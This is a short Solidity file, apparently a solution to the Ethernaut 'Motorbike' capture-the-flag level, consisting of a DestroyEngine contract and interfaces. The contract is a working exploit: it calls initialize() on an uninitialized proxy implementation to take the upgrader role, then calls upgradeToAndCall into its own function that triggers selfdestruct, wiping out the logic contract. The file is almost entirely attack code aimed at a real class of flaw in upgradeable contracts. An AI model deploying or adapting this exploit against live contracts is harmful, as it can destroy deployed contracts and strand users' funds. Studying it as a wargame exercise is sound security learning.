// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IMotorbike {
    fallback() external payable;
}
interface IEngine {
    function upgrader() external view returns (address);
    function horsePower() external view returns (uint256);
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract DestroyEngine {
    function destroy(address engine) external {
        IEngine engineInstance = IEngine(engine);
        engineInstance.initialize();
        engineInstance.upgradeToAndCall(address(this), abi.encodeWithSelector(this.damn.selector));
    }

    function damn() external {
        selfdestruct(payable(msg.sender));
    }
}

